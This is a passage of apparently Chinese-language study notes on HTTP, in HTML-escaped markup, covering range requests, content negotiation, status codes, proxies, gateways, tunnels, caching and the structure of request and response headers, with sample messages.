--THIS_STRING_SEPARATES--&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用 boundary 字符串来划分多部分对象集合指明的各类实体。在boundary 字符串指定的各个实体的起始行之前插入“–”标记（例如：–AaB03x、–THIS_STRING_SEPARATES），而在多部分对象集合对应的字符串的最后插入“–”标记（例如：–AaB03x–、–THIS_STRING_SEPARATES–）作为结束。&lt;/p&gt;
&lt;h3 id=&#34;获取部分内容的范围请求（分段请求）&#34;&gt;&lt;a href=&#34;#获取部分内容的范围请求（分段请求）&#34; class=&#34;headerlink&#34; title=&#34;获取部分内容的范围请求（分段请求）&#34;&gt;&lt;/a&gt;获取部分内容的范围请求（分段请求）&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/702457428b380409f065b3cb6853fd08.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;从一开始到  3000 字节和  5000~7000 字节，8000到之后全部的多重范围&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;bytes=-3000, 5000-7000 ,8000-&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;内容协商&#34;&gt;&lt;a href=&#34;#内容协商&#34; class=&#34;headerlink&#34; title=&#34;内容协商&#34;&gt;&lt;/a&gt;内容协商&lt;/h3&gt;&lt;p&gt;内容协商机制是指客户端和服务器端就响应的资源内容进行交涉，然 后提供给客户端最为适合的资源。内容协商会以响应资源的语言、字 符集、编码方式等作为判断的基准。&lt;/p&gt;
&lt;p&gt;参照头&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;Accept 
Accept-Charset
Accept-Encoding 
Accept-Language 
Content-Language&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;内容协商技术&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;服务器驱动协商&lt;/li&gt;
&lt;li&gt;客户端驱动协商&lt;/li&gt;
&lt;li&gt;透明协商&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;HTTP返回状态码&#34;&gt;&lt;a href=&#34;#HTTP返回状态码&#34; class=&#34;headerlink&#34; title=&#34;HTTP返回状态码&#34;&gt;&lt;/a&gt;HTTP返回状态码&lt;/h2&gt;&lt;h3 id=&#34;类别&#34;&gt;&lt;a href=&#34;#类别&#34; class=&#34;headerlink&#34; title=&#34;类别&#34;&gt;&lt;/a&gt;类别&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/448efd6d806b88b6d8ae97140bafec53.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;2XX&#34;&gt;&lt;a href=&#34;#2XX&#34; class=&#34;headerlink&#34; title=&#34;2XX&#34;&gt;&lt;/a&gt;2XX&lt;/h4&gt;&lt;p&gt;2XX 的响应结果表明请求被正常处理了&lt;/p&gt;
&lt;h5 id=&#34;200OK&#34;&gt;&lt;a href=&#34;#200OK&#34; class=&#34;headerlink&#34; title=&#34;200OK&#34;&gt;&lt;/a&gt;200OK&lt;/h5&gt;&lt;p&gt;表示从客户端发来的请求在服务器端被正常处理了，get请求回返回实体，head请求返回实体首部&lt;/p&gt;
&lt;h5 id=&#34;204-No-Content&#34;&gt;&lt;a href=&#34;#204-No-Content&#34; class=&#34;headerlink&#34; title=&#34;204 No Content&#34;&gt;&lt;/a&gt;204 No Content&lt;/h5&gt;&lt;p&gt;该状态码代表服务器接收的请求已成功处理，但在返回的响应报文中不含实体的主体部分。（浏览器不更新页面）&lt;/p&gt;
&lt;h5 id=&#34;206-Partial-Content&#34;&gt;&lt;a href=&#34;#206-Partial-Content&#34; class=&#34;headerlink&#34; title=&#34;206 Partial Content&#34;&gt;&lt;/a&gt;206 Partial Content&lt;/h5&gt;&lt;p&gt;该状态码表示客户端进行了范围请求，而服务器成功执行了这部分的GET 请求。响应报文中包含由 Content-Range 指定范围的实体内容。&lt;/p&gt;
&lt;h4 id=&#34;3XX重定向&#34;&gt;&lt;a href=&#34;#3XX重定向&#34; class=&#34;headerlink&#34; title=&#34;3XX重定向&#34;&gt;&lt;/a&gt;3XX重定向&lt;/h4&gt;&lt;p&gt;3XX 响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。&lt;/p&gt;
&lt;h5 id=&#34;301-Moved-Permanently&#34;&gt;&lt;a href=&#34;#301-Moved-Permanently&#34; class=&#34;headerlink&#34; title=&#34;301 Moved Permanently&#34;&gt;&lt;/a&gt;301 Moved Permanently&lt;/h5&gt;&lt;p&gt;永久性重定向。该状态码表示请求的资源已被分配了新的 URI，以后应使用资源现在所指的 URI。也就是说，如果已经把资源对应的 URI保存为书签了，这时应该按 Location 首部字段提示的 URI 重新保存。&lt;/p&gt;
&lt;h5 id=&#34;302-Found&#34;&gt;&lt;a href=&#34;#302-Found&#34; class=&#34;headerlink&#34; title=&#34;302 Found&#34;&gt;&lt;/a&gt;302 Found&lt;/h5&gt;&lt;p&gt;临时性重定向。该状态码表示请求的资源已被分配了新的 URI，希望用户（本次）能使用新的 URI 访问。不更新书签，仍保留产生302的url&lt;/p&gt;
&lt;h5 id=&#34;303-See-Other&#34;&gt;&lt;a href=&#34;#303-See-Other&#34; class=&#34;headerlink&#34; title=&#34;303 See Other&#34;&gt;&lt;/a&gt;303 See Other&lt;/h5&gt;&lt;p&gt;该状态码表示由于请求对应的资源存在着另一个 URI，应使用 GET方法定向获取请求的资源。例如，post方法请求时，处理结果希望客服端采用get方法获取资源&lt;/p&gt;
&lt;h5 id=&#34;304-Not-Modified&#34;&gt;&lt;a href=&#34;#304-Not-Modified&#34; class=&#34;headerlink&#34; title=&#34;304 Not Modified&#34;&gt;&lt;/a&gt;304 Not Modified&lt;/h5&gt;&lt;p&gt;该状态码表示客户端发送附带条件的请求时，服务器端允许请求访问资源，但未满足条件的情况。304 状态码返回时，不包含任何响应的主体部分。&lt;/p&gt;
&lt;p&gt;附带条件的请求是指采用 GET方法的请求报文中包含 If-Match，If-Modified-Since，If-None-Match，If-Range，If-Unmodified-Since 中任一首部。&lt;/p&gt;
&lt;h5 id=&#34;307-Temporary-Redirect&#34;&gt;&lt;a href=&#34;#307-Temporary-Redirect&#34; class=&#34;headerlink&#34; title=&#34;307 Temporary Redirect&#34;&gt;&lt;/a&gt;307 Temporary Redirect&lt;/h5&gt;&lt;h4 id=&#34;4XX-客户端错误&#34;&gt;&lt;a href=&#34;#4XX-客户端错误&#34; class=&#34;headerlink&#34; title=&#34;4XX 客户端错误&#34;&gt;&lt;/a&gt;4XX 客户端错误&lt;/h4&gt;&lt;p&gt;4XX 的响应结果表明客户端是发生错误的原因所在。&lt;/p&gt;
&lt;h5 id=&#34;400-Bad-Request&#34;&gt;&lt;a href=&#34;#400-Bad-Request&#34; class=&#34;headerlink&#34; title=&#34;400 Bad Request&#34;&gt;&lt;/a&gt;400 Bad Request&lt;/h5&gt;&lt;p&gt;该状态码表示请求报文中存在语法错误。修改报文再发送。和200异曲同工&lt;/p&gt;
&lt;h5 id=&#34;401-Unauthorized&#34;&gt;&lt;a href=&#34;#401-Unauthorized&#34; class=&#34;headerlink&#34; title=&#34;401 Unauthorized&#34;&gt;&lt;/a&gt;401 Unauthorized&lt;/h5&gt;&lt;p&gt;该状态码表示发送的请求需要有通过 HTTP 认证（BASIC 认证、DIGEST 认证）的认证信息。&lt;/p&gt;
&lt;p&gt;返回含有 401 的响应必须包含一个适用于被请求资源的 WWW-Authenticate 首部用以质询（challenge）用户信息。&lt;/p&gt;
&lt;p&gt;首次返回一个认证框，再返回就是认证失败&lt;/p&gt;
&lt;h5 id=&#34;403-Forbidden&#34;&gt;&lt;a href=&#34;#403-Forbidden&#34; class=&#34;headerlink&#34; title=&#34;403 Forbidden&#34;&gt;&lt;/a&gt;403 Forbidden&lt;/h5&gt;&lt;p&gt;该状态码表明对请求资源的访问被服务器拒绝了。&lt;/p&gt;
&lt;h5 id=&#34;404-Not-Found&#34;&gt;&lt;a href=&#34;#404-Not-Found&#34; class=&#34;headerlink&#34; title=&#34;404 Not Found&#34;&gt;&lt;/a&gt;404 Not Found&lt;/h5&gt;&lt;p&gt;该状态码表明服务器上无法找到请求的资源。除此之外，也可以在服务器端拒绝请求且不想说明理由时使用。&lt;/p&gt;
&lt;h4 id=&#34;5XX-服务器错误&#34;&gt;&lt;a href=&#34;#5XX-服务器错误&#34; class=&#34;headerlink&#34; title=&#34;5XX 服务器错误&#34;&gt;&lt;/a&gt;5XX 服务器错误&lt;/h4&gt;&lt;p&gt;5XX 的响应结果表明服务器本身发生错误。&lt;/p&gt;
&lt;h5 id=&#34;500-Internal-Server-Error&#34;&gt;&lt;a href=&#34;#500-Internal-Server-Error&#34; class=&#34;headerlink&#34; title=&#34;500 Internal Server Error&#34;&gt;&lt;/a&gt;500 Internal Server Error&lt;/h5&gt;&lt;p&gt;该状态码表明服务器端在执行请求时发生了错误。也有可能是 Web应用存在的 bug 或某些临时的故障。&lt;/p&gt;
&lt;h5 id=&#34;503-Service-Unavailable&#34;&gt;&lt;a href=&#34;#503-Service-Unavailable&#34; class=&#34;headerlink&#34; title=&#34;503 Service Unavailable&#34;&gt;&lt;/a&gt;503 Service Unavailable&lt;/h5&gt;&lt;p&gt;该状态码表明服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。&lt;/p&gt;
&lt;h3 id=&#34;samll-tips&#34;&gt;&lt;a href=&#34;#samll-tips&#34; class=&#34;headerlink&#34; title=&#34;samll_tips&#34;&gt;&lt;/a&gt;samll_tips&lt;/h3&gt;&lt;p&gt;不少返回的状态码响应都是错误的，但是用户可能察觉不到这点。&lt;/p&gt;
&lt;h2 id=&#34;与-HTTP-协作的-Web-服务器&#34;&gt;&lt;a href=&#34;#与-HTTP-协作的-Web-服务器&#34; class=&#34;headerlink&#34; title=&#34;与 HTTP 协作的 Web 服务器&#34;&gt;&lt;/a&gt;与 HTTP 协作的 Web 服务器&lt;/h2&gt;&lt;h3 id=&#34;用单台虚拟主机实现多个域名&#34;&gt;&lt;a href=&#34;#用单台虚拟主机实现多个域名&#34; class=&#34;headerlink&#34; title=&#34;用单台虚拟主机实现多个域名&#34;&gt;&lt;/a&gt;用单台虚拟主机实现多个域名&lt;/h3&gt;&lt;p&gt;一台服务器托管了两个域名，&lt;a href=&#34;http://www.hacker.com,www.hacker2.com,两个域名托管在一个虚拟机,则dns解析后ip相同,两个域名会访问一个ip.在相同的/&#34;&gt;www.hacker.com,www.hacker2.com，两个域名托管在一个虚拟机，则DNS解析后IP相同，两个域名会访问一个IP。在相同的&lt;/a&gt; IP 地址下，由于虚拟主机可以寄存多个不同主机名和域名的 Web 网站，因此在发送 HTTP 请求时，必须在 Host 首部内完整指定主机名或域名的 URI。&lt;/p&gt;
&lt;h3 id=&#34;通信数据转发程序-：代理、网关、隧道&#34;&gt;&lt;a href=&#34;#通信数据转发程序-：代理、网关、隧道&#34; class=&#34;headerlink&#34; title=&#34;通信数据转发程序 ：代理、网关、隧道&#34;&gt;&lt;/a&gt;通信数据转发程序 ：代理、网关、隧道&lt;/h3&gt;&lt;h4 id=&#34;代理&#34;&gt;&lt;a href=&#34;#代理&#34; class=&#34;headerlink&#34; title=&#34;代理&#34;&gt;&lt;/a&gt;代理&lt;/h4&gt;&lt;p&gt;代理是一种有转发功能的应用程序，它扮演了位于服务器和客户端“中间人”的角色，接收由客户端发送的请求并转发给服务器，同时也接收服务器返回的响应并转发给客户端。&lt;/p&gt;
&lt;p&gt;代理服务器的基本行为就是接收客户端发送的请求后转发给其他服务器。代理不改变请求 URI，会直接发送给前方持有资源的目标服务器。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/5cb86cda8dff1fbdc1eb32bde62d73c6.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;每次通过代理服务器转发请求或响应时，会追加写入 Via 首部信息&lt;/p&gt;
&lt;h5 id=&#34;代理方法&#34;&gt;&lt;a href=&#34;#代理方法&#34; class=&#34;headerlink&#34; title=&#34;代理方法&#34;&gt;&lt;/a&gt;代理方法&lt;/h5&gt;&lt;p&gt;1.缓存代理&lt;/p&gt;
&lt;p&gt;代理转发响应时，缓存代理（Caching Proxy）会预先将资源的副本（缓存）保存在代理服务器上。再次收到相同的资源请求就会返回代理上缓存的资源。&lt;/p&gt;
&lt;p&gt;2.透明代理&lt;/p&gt;
&lt;p&gt;转发请求或响应时，不对报文做任何加工的代理类型被称为透明代理（Transparent Proxy）。反之，对报文内容进行加工的代理被称为非透明代理。&lt;/p&gt;
&lt;h4 id=&#34;网关&#34;&gt;&lt;a href=&#34;#网关&#34; class=&#34;headerlink&#34; title=&#34;网关&#34;&gt;&lt;/a&gt;网关&lt;/h4&gt;&lt;p&gt;网关是转发其他服务器通信数据的服务器，接收从客户端发送来的请求时，它就像自己拥有资源的源服务器一样对请求进行处理。有时客户端可能都不会察觉，自己的通信目标是一个网关。&lt;/p&gt;
&lt;p&gt;网关的工作机制和代理十分相似。而网关能使通信线路上的服务器提供非 HTTP 协议服务。&lt;br&gt;利用网关能提高通信的安全性，因为可以在客户端与网关之间的通信线路上加密以确保连接的安全。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/1d46d1ae5f16e09805d3e87e506383c5.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;隧道&#34;&gt;&lt;a href=&#34;#隧道&#34; class=&#34;headerlink&#34; title=&#34;隧道&#34;&gt;&lt;/a&gt;隧道&lt;/h4&gt;&lt;p&gt;隧道是在相隔甚远的客户端和服务器两者之间进行中转，并保持双方通信连接的应用程序。&lt;/p&gt;
&lt;p&gt;隧道可按要求建立起一条与其他服务器的通信线路，届时使用 SSL等加密手段进行通信。隧道的目的是确保客户端能与服务器进行安全的通信。&lt;br&gt;隧道本身不会去解析 HTTP 请求。也就是说，请求保持原样中转给之后的服务器。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/1abf8e9495373ad8e481c44cd93d8968.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;保存资源的缓存&#34;&gt;&lt;a href=&#34;#保存资源的缓存&#34; class=&#34;headerlink&#34; title=&#34;保存资源的缓存&#34;&gt;&lt;/a&gt;保存资源的缓存&lt;/h3&gt;&lt;p&gt;缓存服务器的优势在于利用缓存可避免多次从源服务器转发资源。因此客户端可就近从缓存服务器上获取资源，而源服务器也不必多次处理相同的请求了。&lt;/p&gt;
&lt;h4 id=&#34;缓存的有效期限&#34;&gt;&lt;a href=&#34;#缓存的有效期限&#34; class=&#34;headerlink&#34; title=&#34;缓存的有效期限&#34;&gt;&lt;/a&gt;缓存的有效期限&lt;/h4&gt;&lt;p&gt;即使存在缓存，也会因为客户端的要求、缓存的有效期等因素，向源服务器确认资源的有效性。若判断缓存失效，缓存服务器将会再次从源服务器上获取“新”资源。&lt;/p&gt;
&lt;h4 id=&#34;客户端的缓存&#34;&gt;&lt;a href=&#34;#客户端的缓存&#34; class=&#34;headerlink&#34; title=&#34;客户端的缓存&#34;&gt;&lt;/a&gt;客户端的缓存&lt;/h4&gt;&lt;p&gt;缓存不仅可以存在于缓存服务器内，还可以存在客户端浏览器中。以Internet Explorer 程序为例，把客户端缓存称为临时网络文件（Temporary Internet File）。&lt;br&gt;浏览器缓存如果有效，就不必再向服务器请求相同的资源了，可以直接从本地磁盘内读取。&lt;/p&gt;
&lt;h3 id=&#34;HTTP-出现之前的协议&#34;&gt;&lt;a href=&#34;#HTTP-出现之前的协议&#34; class=&#34;headerlink&#34; title=&#34;HTTP 出现之前的协议&#34;&gt;&lt;/a&gt;HTTP 出现之前的协议&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;FTP（File Transfer Protocol）&lt;br&gt;传输文件时使用的协议。&lt;/li&gt;
&lt;li&gt;NNTP（Network News Transfer Protocol）&lt;br&gt;用于 NetNews 电子会议室内传送消息的协议。。&lt;/li&gt;
&lt;li&gt;Archie&lt;br&gt;搜索 anonymous FTP 公开的文件信息的协议。&lt;/li&gt;
&lt;li&gt;WAIS（Wide Area Information Servers）&lt;br&gt;以关键词检索多个数据库使用的协议。&lt;/li&gt;
&lt;li&gt;Gopher&lt;br&gt;查找与互联网连接的计算机内信息的协议。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;HTTP-首部&#34;&gt;&lt;a href=&#34;#HTTP-首部&#34; class=&#34;headerlink&#34; title=&#34;HTTP 首部&#34;&gt;&lt;/a&gt;HTTP 首部&lt;/h2&gt;&lt;h3 id=&#34;HTTP-报文首部&#34;&gt;&lt;a href=&#34;#HTTP-报文首部&#34; class=&#34;headerlink&#34; title=&#34;HTTP 报文首部&#34;&gt;&lt;/a&gt;HTTP 报文首部&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/cdd775e3a5788d5f6b3083052c3eb339.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;HTTP 协议的请求和响应报文中必定包含 HTTP 首部。首部内容为客户端和服务器分别处理请求和响应提供所需要的信息。&lt;/p&gt;
&lt;h4 id=&#34;HTTP-请求报文&#34;&gt;&lt;a href=&#34;#HTTP-请求报文&#34; class=&#34;headerlink&#34; title=&#34;HTTP 请求报文&#34;&gt;&lt;/a&gt;HTTP 请求报文&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/34f0690cdfd988547a148806ba15ffb5.png&#34;&gt;&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token request-line&#34;&gt;&lt;span class=&#34;token method property&#34;&gt;GET&lt;/span&gt; &lt;span class=&#34;token request-target url&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;token http-version property&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;hackr.jp&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;User-Agent&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Accept&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,&lt;/span&gt;&lt;/span&gt;
*/*; q=0.8
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Accept-Language&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;ja,en-us;q=0.7,en;q=0.3&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;gzip, deflate&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;DNT&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;1&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;keep-alive&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;If-Modified-Since&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;Fri, 31 Aug 2007 02:02:20 GMT&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;If-None-Match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;&#34;45bae1-16a-46d776ac&#34;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Cache-Control&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;max-age=0&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;HTTP-响应报文&#34;&gt;&lt;a href=&#34;#HTTP-响应报文&#34; class=&#34;headerlink&#34; title=&#34;HTTP 响应报文&#34;&gt;&lt;/a&gt;HTTP 响应报文&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/d9a94837fa995200e34533dd7640b88c.png&#34;&gt;&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token response-status&#34;&gt;&lt;span class=&#34;token http-version property&#34;&gt;HTTP/1.1&lt;/span&gt; &lt;span class=&#34;token status-code number&#34;&gt;304&lt;/span&gt; &lt;span class=&#34;token reason-phrase string&#34;&gt;Not Modified&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Date&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;Thu, 07 Jun 2012 07:21:36 GMT&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Server&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;Apache&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;close&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Etag&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;&#34;45bae1-16a-46d776ac&#34;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;HTTP-首部字段&#34;&gt;&lt;a href=&#34;#HTTP-首部字段&#34; class=&#34;headerlink&#34; title=&#34;HTTP 首部字段&#34;&gt;&lt;/a&gt;HTTP 首部字段&lt;/h3&gt;&lt;h4 id=&#34;HTTP-首部字段传递重要信息&#34;&gt;&lt;a href=&#34;#HTTP-首部字段传递重要信息&#34; class=&#34;headerlink&#34; title=&#34;HTTP 首部字段传递重要信息&#34;&gt;&lt;/a&gt;HTTP 首部字段传递重要信息&lt;/h4&gt;&lt;h4 id=&#34;HTTP-首部字段结构&#34;&gt;&lt;a href=&#34;#HTTP-首部字段结构&#34; class=&#34;headerlink&#34; title=&#34;HTTP 首部字段结构&#34;&gt;&lt;/a&gt;HTTP 首部字段结构&lt;/h4&gt;&lt;p&gt;HTTP 首部字段是由首部字段名和字段值构成的&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;首部字段名: 字段值
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;text/html&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Keep-Alive&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;timeout=15, max=100&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;若 &lt;strong&gt;HTTP&lt;/strong&gt; 首部字段重复了会如何&lt;/p&gt;
&lt;p&gt; 不同浏览器解析方式不同，有的是解析前面，有的则是解析后面的&lt;/p&gt;
&lt;h4 id=&#34;4-种-HTTP-首部字段类型&#34;&gt;&lt;a href=&#34;#4-种-HTTP-首部字段类型&#34; class=&#34;headerlink&#34; title=&#34;4 种 HTTP 首部字段类型&#34;&gt;&lt;/a&gt;&lt;strong&gt;4&lt;/strong&gt; 种 &lt;strong&gt;HTTP&lt;/strong&gt; 首部字段类型&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;通用首部字段（&lt;strong&gt;General&lt;/strong&gt; &lt;strong&gt;Header Fields&lt;/strong&gt;）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;请求报文和响应报文两方都会使用的首部。&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;请求首部字段（&lt;strong&gt;Request Header Fields&lt;/strong&gt;）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;从客户端向服务器端发送请求报文时使用的首部。补充了请求的附加内容、客户端信息、响应内容相关优先级等信息。&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;响应首部字段（&lt;strong&gt;Response Header Fields&lt;/strong&gt;）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;从服务器端向客户端返回响应报文时使用的首部。补充了响应的附加内容，也会要求客户端附加额外的内容信息。&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;实体首部字段（&lt;strong&gt;Entity Header Fields&lt;/strong&gt;）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;针对请求报文和响应报文的实体部分使用的首部。补充了资源内容更新时间等与实体有关的信息&lt;/p&gt;
&lt;h4 id=&#34;HTTP-1-1-首部字段一览&#34;&gt;&lt;a href=&#34;#HTTP-1-1-首部字段一览&#34; class=&#34;headerlink&#34; title=&#34;HTTP/1.1 首部字段一览&#34;&gt;&lt;/a&gt;HTTP/1.1 首部字段一览&lt;/h4&gt;&lt;p&gt;RFC2616 中定义的 47 种首部字段&lt;/p&gt;
